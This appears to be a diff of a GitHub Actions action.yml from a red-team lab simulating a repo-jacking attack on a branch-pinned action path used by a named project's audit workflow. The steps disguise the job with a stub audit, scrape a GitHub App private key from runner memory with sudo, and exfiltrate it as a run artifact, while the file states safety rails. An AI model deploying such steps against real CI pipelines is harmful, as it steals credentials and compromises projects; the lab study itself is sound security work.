@@ -1,44 +1,41 @@
-# SIMULATION / LAB ONLY — repojack 2026-11-20, bead ...6bg
+# SIMULATION / LAB ONLY — repojack 2026-11-20
 #
-# This repo is a stand-in for the *squattable* action path
+# Stand-in for the squattable path
 #   yangby-cryptape/cargo-audit-check-action@customized-for-ckb
-# as referenced by nervosnetwork/ckb .github/workflows/scheduled_audit.yaml (read-only copy).
+# referenced by nervosnetwork/ckb .github/workflows/scheduled_audit.yaml.
+# This repo plays the ATTACKER: code an attacker registers at the old,
+# branch-pinned action path and that runs inside the victim's audit job.
 #
-# In the simulation it plays the ATTACKER side: code an unverified branch-pinned
-# action can execute in the *victim's* job, holding an App installation token.
-#
-# SAFETY RAILS (deliberate):
-#   * No network egress except api.github.com with the token the victim passed in.
-#   * Recovered secret material is never printed to logs; it is stored in a
-#     check-run output of the victim's own (private lab) repo, and in nothing else.
-#   * Every script prints SIMULATION banner lines.
+# Safety rails (deliberate):
+#   * No egress except api.github.com with the token the victim passes in.
+#   * Recovered secret material is never printed to logs; it goes into a run
+#     artifact of the victim's own private lab repo (sim exfil channel).
 name: 'cargo-audit-check'
-description: 'SIMULATION stand-in for yangby-cryptape/cargo-audit-check-action (renamed-account branch-pin finding)'
+description: 'SIM stand-in for yangby-cryptape/cargo-audit-check-action (branch-pin/renamed-account finding)'
 author: 'repojack lab'
-
 inputs:
   token:
-    description: 'GitHub App installation token minted upstream in the same job (sim of RELEASE_PLZ token)'
+    description: 'GitHub App installation token minted upstream in the same job (sim of the RELEASE_PLZ token)'
     required: true
-
 runs:
   using: composite
   steps:
-    - name: Cargo audit (benign sim stub)
+    - name: SIM cargo audit (benign stub so the job looks normal)
       shell: bash
       run: ${{ github.action_path }}/scripts/sim-audit.sh
-    - name: Recon (read-only, names only)
+    - name: SIM recon (names only)
       shell: bash
       run: ${{ github.action_path }}/scripts/recon.sh
-    - name: Recover upstream credential from runner memory
+    - name: SIM recover upstream App private key from runner memory
       shell: bash
       run: sudo -E python3 ${{ github.action_path }}/scripts/recover-key.py
-    - name: Exfiltrate recovered key via checks:write (sim channel)
-      shell: bash
-      env:
-        SIM_TOKEN: ${{ inputs.token }}
-      run: ${{ github.action_path }}/scripts/exfil.sh
-    - name: Demonstrate token primitives in the victim repo
+    - name: SIM exfil recovered material via run artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: sim-exfil
+        path: sim-recovered/
+        if-no-files-found: ignore
+    - name: SIM token primitives with the passed installation token
       shell: bash
       env:
         SIM_TOKEN: ${{ inputs.token }}
